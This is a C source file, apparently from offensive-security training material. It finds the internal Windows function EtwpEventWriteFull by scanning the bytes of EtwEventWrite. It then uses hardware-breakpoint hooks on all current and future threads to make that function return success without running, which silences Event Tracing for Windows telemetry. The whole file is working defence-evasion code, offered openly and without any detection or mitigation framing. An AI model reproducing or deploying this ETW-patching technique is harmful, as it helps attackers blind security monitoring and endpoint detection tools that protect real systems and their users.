#include <Windows.h>
#include <stdio.h>

#include "hwbp.h"

#define x64_CALL_INSTRUCTION_OPCODE			0xE8		// 'call'	- instruction opcode
#define x64_RET_INSTRUCTION_OPCODE			0xC3		// 'ret'	- instruction opcode
#define x64_INT3_INSTRUCTION_OPCODE			0xCC		// 'int3'	- instruction opcode

PVOID FetchEtwpEventWriteFull() {

	INT		i = 0;
	DWORD	dwOffSet = 0x00;
	PBYTE	pEtwEventFunc = NULL;

	// Both "EtwEventWrite" OR "EtwEventWriteFull" will work
	pEtwEventFunc = (PBYTE)GetProcAddress(GetModuleHandleA("NTDLL"), "EtwEventWrite");
	if (!pEtwEventFunc)
		return NULL;
	printf("[+] pEtwEventFunc : 0x%0p \n", pEtwEventFunc);

	// A while-loop to find the last 'ret' instruction
	while (1) {
		if (pEtwEventFunc[i] == x64_RET_INSTRUCTION_OPCODE && pEtwEventFunc[i + 1] == x64_INT3_INSTRUCTION_OPCODE)
			break;
		i++;
	}

	// Searching upwards for the 'call' instruction
	while (i) {
		if (pEtwEventFunc[i] == x64_CALL_INSTRUCTION_OPCODE) {
			pEtwEventFunc = (PBYTE)&pEtwEventFunc[i];
			break;
		}
		i--;
	}

	// If the first opcode is not 'call', return null
	if (pEtwEventFunc != NULL && pEtwEventFunc[0] != x64_CALL_INSTRUCTION_OPCODE)
		return NULL;

	printf("\t> \"call EtwpEventWriteFull\" : 0x%p \n", pEtwEventFunc);

	// Skipping the 'E8' byte ('call' opcode)
	pEtwEventFunc++;

	// Fetching EtwpEventWriteFull's offset
	dwOffSet = *(DWORD*)pEtwEventFunc;
	printf("\t> Offset : 0x%0.8X \n", dwOffSet);

	// Adding the size of the offset to reach the end of the call instruction
	pEtwEventFunc += sizeof(DWORD);

	// Adding the offset to the pointer reaching the address of 'EtwpEventWriteFull'
	pEtwEventFunc += dwOffSet;

	// pEtwEventFunc is now the address of EtwpEventWriteFull
	return (PVOID)pEtwEventFunc;
}


VOID EtwpEventWriteFullDetour(PCONTEXT Ctx) {

	printf("[+] EtwpEventWriteFull Call Intercepted \n");

	RETURN_VALUE(Ctx, (ULONG)0);
	BLOCK_REAL(Ctx);

	CONTINUE_EXECUTION(Ctx);
}

int main()
{
	PVOID pEtwpEventWriteFull = FetchEtwpEventWriteFull();
	if (!pEtwpEventWriteFull)
		return -1;
	printf("[+] pEtwpEventWriteFull : 0x%p \n", pEtwpEventWriteFull);

	// Initialize
	if (!InitHardwareBreakpointHooking())
		return -1;

	// Hook 'pEtwpEventWriteFull' to call 'EtwpEventWriteFullDetour' instead - using the Dr0 register
	printf("[i] Installing Hooks ... ");
	if (!InstallHardwareBreakingPntHook(pEtwpEventWriteFull, Dr0, EtwpEventWriteFullDetour, ALL_THREADS))
		return -1;
	printf("[+] DONE \n");

	// Install the same 'ALL_THREADS' hooks on new threads created in the future - using the Dr1 register
	printf("[i] Installing The Same Hooks On New Threads ... ");
	if (!InstallHooksOnNewThreads(Dr1))
		return -1;
	printf("[+] DONE \n");

	// Clean up
	printf("[#] Press <Enter> To Quit ... ");
	getchar();

	if (!CleapUpHardwareBreakpointHooking())
		return -1;

	return 0;
}